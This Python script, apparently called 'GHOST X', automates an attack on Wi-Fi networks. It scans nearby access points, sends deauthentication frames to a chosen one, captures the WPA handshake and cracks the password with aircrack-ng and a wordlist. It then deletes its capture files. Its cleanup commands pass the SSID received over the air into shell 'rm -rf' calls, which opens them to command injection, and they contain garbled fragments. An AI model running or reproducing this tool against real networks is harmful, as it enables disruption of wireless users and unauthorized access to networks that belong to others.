from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
from scapy.layers.eap import EAPOL
import threading,random,time,os,subprocess,sys,re,shutil

target_ssid=None
data_networks={}
data_ch={}
data_bssid={}
networks={}
n=0
stop_hopper = threading.Event()

def check_tools():
      print("\n[+] check tools and librery\n")
      if shutil.which("aircrack-ng"):
            print("[+] aircrack-ng found ")
      else:
            print("[+] aircrack-ng not found")
            sys.exit()    
      if shutil.which("airodump-ng"):
            print("[+] airodump-ng found ")
      else:
            print("[+] airodump-ng not found")
            sys.exit()          
      if shutil.which("airmon-ng"):
            print("[+] airmon-ng found ")
      else:
            print("[+] airmon-ng not found")
            sys.exit()  
      try:
          import scapy
          print('[+] scapy found')
      except ModuleNotFoundError:
          print('[+] scapy not found')
          sys.exit() 
      try:
          import threading
          print('[+] threading found')
      except ModuleNotFoundError:
          print('[+] threading not found') 
          sys.exit()
      try:
          import subprocess
          print('[+] subprocess found')
      except ModuleNotFoundError:
          print('[+] subprocess not found')
          sys.exit()
      time.sleep(3)      
      #for clear the terminal
      os.system("clear")

def crack_handshake():
        global target_ssid
        print("[+] start cracking")
        c=subprocess.Popen(['aircrack-ng','-w','passwordlist.txt',f'{target_ssid}-01.cap'],stdout=subprocess.PIPE,stderr=subprocess.DEVNULL, text=True)
        stdout,_=c.communicate()
        match=re.search(r'KEY FOUND!\s*\[\s*([^\s\]]+)',stdout)
        if match:
             password=match.group(1).strip()
             print(f'[+] PASSWORD FOUND: {password}')
             os.system(f"rm -rf {target_ssid}-01.cap & rm -rf {target_ssid}-01.csv & rm -rf {target_ssid}-01.kismet.csv & rm -rf {target_ssid}-01.kismet.netxml & rm -rf {target_ssid}-01.kismet.netxml & rm -rf                  c    {target_ssid}-01.log.csv")   
        else:
             print("[-] PASSWORD NOT FOUND ") 
             os.system(f"rm -rf {target_ssid}-01.cap & rm -rf {target_ssid}-01.csv & rm -rf {target_ssid}-01.kismet.csv & rm -rf {target_ssid}-01.kismet.netxml & rm -rf {target_ssid}-01.kismet.netxml & rm -rf                  c    {target_ssid}-01.log.csv")      

def handshake_check():
        global target_ssid
        stop_hopper.set()   
        time.sleep(1) 
        NUM=int(input("[+] N: "))
        print("[+] starting check handshake please waite ..........")
        target_ap=data_bssid[NUM]
        target_ch=data_ch[NUM]
        target_ssid=data_networks[target_ap]
        os.system(f"iw dev wlan0mon set channel {target_ch}")
        deauth=subprocess.Popen(['aireplay-ng','--deauth','7','-a',target_ap,'wlan0mon'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        stdout,stderr=deauth.communicate()
        h=subprocess.Popen(['airodump-ng','-c',str(target_ch),'--bssid',target_ap,'-w',target_ssid,'wlan0mon'],stdout=subprocess.PIPE,stderr=subprocess.PIPE ,text=True)
        try:
             stdout, stderr = h.communicate(timeout=30)
        except subprocess.TimeoutExpired:
                h.terminate()
        
        packets = rdpcap(f"{target_ssid}-01.cap")
        count = 0
        for pkt in packets:
            if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
                 addr1 = pkt[Dot11].addr1
                 addr2 = pkt[Dot11].addr2

                 if addr1 and addr2:
                      if target_ap in [addr1.lower(), addr2.lower()]:
                            count += 1
        if count >= 2:
            print("[+] Handshake FOUND ")
            crack_handshake()
        else:
            print("[-] Handshake NOT found ")   
            os.system(f"rm -rf {target_ssid}-01.cap & rm -rf {target_ssid}-01.csv & rm -rf {target_ssid}-01.kismet.csv & rm -rf {target_ssid}-01.kismet.netxml & rm -rf {target_ssid}-01.kismet.netxml & rm -rf                  c    {target_ssid}-01.log.csv")                 
                                       

def check_root():
         if os.geteuid() != 0:
                print("[+] please! run this program as root  !!!")
                sys.exit()

                
                           
           
def channel_hopper():
    channels = list(range(1, 14))
    while not stop_hopper.is_set():
        ch = random.choice(channels)
        os.system(f"iw dev wlan0mon set channel {ch}")
        time.sleep(1)
        
def scan(pkt):
     global n,ssid
     if pkt.haslayer(Dot11Beacon):
         bssid=pkt[Dot11].addr2
         if bssid in networks:
           return
           
         ssid=None
         crypto=None
         wps=False
         channel=None
         elt=pkt[Dot11Elt]
         cap=pkt[Dot11Beacon].cap
         while isinstance(elt,Dot11Elt):
               if elt.ID==0:
                   ssid=elt.info.decode(errors='ignore') or "<hidden>"
               elif elt.ID==3: 
                    channel=elt.info[0] 
               elif elt.ID==48:
                    crypto="WPA2"
               elif elt.ID==221 and elt.info.startswith(b'\x00P\xf2\x01'):
                        crypto="WPA"                        
               elif elt.ID==221 and elt.info.startswith(b'\x00P\xf2\x04'):
               
                     wps=True
               elt=elt.payload
         privacy=cap & 0x10
         if crypto is None:
               crypto="WEP" if privacy else "OPEN"            
               
         data_networks[bssid]=ssid
         networks[bssid]=True
         n=n+1 
         data_ch[n]=channel
         data_bssid[n]=bssid
         print(f"N: {n:<4}  SSID: {ssid:<25} BSSID: {bssid:<20} CRYPTO: {crypto:<10} CH: {channel:<10} WPS: {' Yes' if wps else ' No':<10}")
         
              
               
check_root()
check_tools()
time.sleep(1)
print("""

⠀⠀⣿⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⡰⠋⢙⣿⣦⡀⠀⠀⠀⠀⠀
⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣦⣮⣤⡀⣸⣿⣿⣿⣆⠀⠀⠀⠀
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⣿⢟⣫⠟⠋⠀⠀⠀⠀
⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⣷⣿⡁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢹⣿⣿⣧⣿⣿⣆⡹⣖⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣤⣿⣿⣿⡟⠹⣿⣿⣿⣿⣷⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⣴⣿⣿⣿⣿⠏⢧⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠈⢳⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢳
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣼⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠛⠻⠿⣿⣿⣿⡿⠿⠿⠿⠿⠿⢿⣿⣿⠏⠀⠀⠀⠀⠀⠀

              GHOST X

""")
print("[+]  starting scan ............")
print("[+]  Scanning for 25 seconds...")
p=subprocess.Popen(['airmon-ng','start','wlan0'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
stdout,stderr=p.communicate()
print("[+]  Enabling monitor mode\n")
threading.Thread(target=channel_hopper, daemon=True).start()

sniff(iface='wlan0mon',timeout=25,prn=scan,store=0)

print("\n[+] scan stopped")
handshake_check()
print("\n[+] Disabling monitor mode")
p=subprocess.Popen(['airmon-ng','stop','wlan0mon'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
stdout,stderr=p.communicate()



